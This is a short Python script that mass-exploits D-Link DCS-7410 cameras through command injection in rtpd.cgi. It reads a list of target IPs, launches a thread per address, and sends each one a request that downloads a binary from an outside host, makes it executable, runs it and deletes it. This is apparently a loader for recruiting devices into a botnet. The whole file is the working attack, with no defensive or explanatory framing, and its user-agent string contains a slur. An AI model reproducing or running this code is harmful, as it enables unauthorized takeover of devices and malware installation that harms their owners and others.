# D-LINK DCS-7410 "RonBurgundy" Vulnerability
import os
import sys
import time
import threading
import requests

ips = open(sys.argv[1], "r").read().splitlines()

headers = { 
"User-Agent" : "Y0uArEb1GgAY/1.0",
 }
f = 0
s = 0
 
def exploit(ron):
    try:
        global s
        url = 'http://'+ ron +'/cgi-bin/rtpd.cgi?wget&http:/b4.ck.do.or/ron;chmod&777&ron;./ron;rm&-rf&ron'
        requests.get(url, headers=headers, timeout=5)
        s += 1
    except:
        global f
        f +=1
        pass

print 'Fail | Success'
def main(burgundy):
    sys.stdout.flush()
    sys.stdout.write('\r\x1b[0m|\x1b[0;32m'+str(f)+' \x1b[0m|\x1b[0;33m' + str(s) + ' \x1b[0m|\x1b[1;34m')
    sys.stdout.flush()
    exploit(burgundy)
		

for lel in ips:
    t = threading.Thread(target=main, args = (lel,))
    t.start()